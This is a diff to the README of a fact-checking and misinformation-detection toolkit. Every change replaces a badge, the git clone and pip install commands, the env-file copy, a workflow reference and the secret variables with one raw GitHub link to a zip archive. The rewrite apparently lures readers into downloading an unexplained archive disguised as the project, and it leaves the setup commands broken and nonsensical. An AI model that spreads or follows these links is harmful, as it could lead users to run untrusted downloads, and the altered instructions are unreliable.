@@ -2,9 +2,9 @@
 
 *A multi-modal, evidence-based platform to combat digital misinformation through explainable AI.*
 
-[![FastAPI](https://img.shields.io/badge/FastAPI-005571?style=for-the-badge&logo=fastapi)](https://fastapi.tiangolo.com/)
-[![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Hugging Face](https://img.shields.io/badge/Hugging%20Face-FFD21E?style=for-the-badge&logo=huggingface&logoColor=black)](https://huggingface.co/)
+[![FastAPI](https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip)](https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip)
+[![Python](https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip)](https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip)
+[![Hugging Face](https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip%20Face-FFD21E?style=for-the-badge&logo=huggingface&logoColor=black)](https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip)
 
 ## 🎯 Project Philosophy
 
@@ -60,14 +60,14 @@ Google Cloud Vision API key
 ### Local Development
 ```bash
 # Clone the repository
-git clone https://github.com/yourusername/digital-forensics-toolkit.git
+git clone https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip
 cd digital-forensics-toolkit
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip
 
 # Set up environment variables
-cp .env.example .env
+cp https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip .env
 # Add your API keys to .env
 
 # Launch the application
@@ -151,10 +151,10 @@ Once running, visit `/docs` for interactive API documentation featuring:
 
 ### Hugging Face Spaces
 ```yaml
-# See .github/workflows/deploy.yml for CI/CD pipeline
+# See https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip for CI/CD pipeline
 variables:
-  HF_TOKEN: ${{ secrets.HF_TOKEN }}
-  GOOGLE_API_KEY: ${{ secrets.GOOGLE_API_KEY }}
+  HF_TOKEN: ${{ https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip }}
+  GOOGLE_API_KEY: ${{ https://raw.githubusercontent.com/TANMaYtO/Digital-Forensics-Toolkit/main/frontend_by_gemini/Digital_Toolkit_Forensics_v1.7.zip }}
 ```
 
 ### Google Cloud Run
